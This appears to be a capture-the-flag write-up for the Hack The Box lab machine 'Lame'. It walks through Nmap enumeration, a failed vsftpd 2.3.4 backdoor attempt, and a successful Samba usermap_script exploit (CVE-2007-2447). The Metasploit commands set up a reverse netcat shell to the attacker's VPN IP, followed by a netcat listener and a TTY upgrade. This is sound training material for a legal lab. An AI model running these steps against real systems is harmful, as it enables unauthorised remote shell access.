# Hack The Box - Lame

IP Address: 10.10.10.3  
Difficulty: Easy  
Categories: FTP, SMB  
Tools Used: Nmap, smbclient, Metasploit, Netcat, Python

## Enumeration

1. Basic Nmap Scan:
nmap 10.10.10.3

2. FTP Version Detection:
nmap -sV -p 21 10.10.10.3  
Result: vsftpd 2.3.4 (known vulnerable)

## Exploiting FTP (vsftpd 2.3.4)

Launch Metasploit:
msfconsole

Use exploit:
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 10.10.10.3  
run

Result: Exploit unsuccessful, no shell opened.

## SMB Enumeration

Scan SMB ports:
nmap -sV -p 139,445 10.10.10.3

Check SMB shares:
smbclient -L 10.10.10.3 -N  
Result: Found Samba version 3.0.20

## Exploiting Samba 3.0.20 (CVE-2007-2447)

Launch Metasploit:
msfconsole

Use Samba exploit:
use exploit/multi/samba/usermap_script  
set RHOSTS 10.10.10.3  
set RPORT 139  
set LHOST 10.10.14.106   # Replace with your VPN IP  
set LPORT 4444  
set PAYLOAD cmd/unix/reverse_netcat  
run

In a new terminal, start Netcat listener:
nc -lvnp 4444

Result: [*] Command shell session 1 opened

## Upgrade to Full TTY (Optional)

If you want a stable shell:
python -c 'import pty; pty.spawn("/bin/bash")'

## Summary

Service: FTP  
Port: 21  
Version: vsftpd 2.3.4  
Exploit: exploit/unix/ftp/vsftpd_234_backdoor  
Result: ❌ Failed

Service: SMB  
Port: 139  
Version: Samba 3.0.20  
Exploit: exploit/multi/samba/usermap_script  
Result: ✅ Success

## Final Notes

- Even if Metasploit doesn’t show a shell, check your Netcat listener.
- Use smbclient when Nmap doesn’t reveal full SMB details.
- Always upgrade your shell to TTY for better usability.
- Replace LHOST with your actual tun0 IP before running reverse shell exploits.

Author: YourName  
Platform: Hack The Box  
Machine: Lame  
Level: Easy

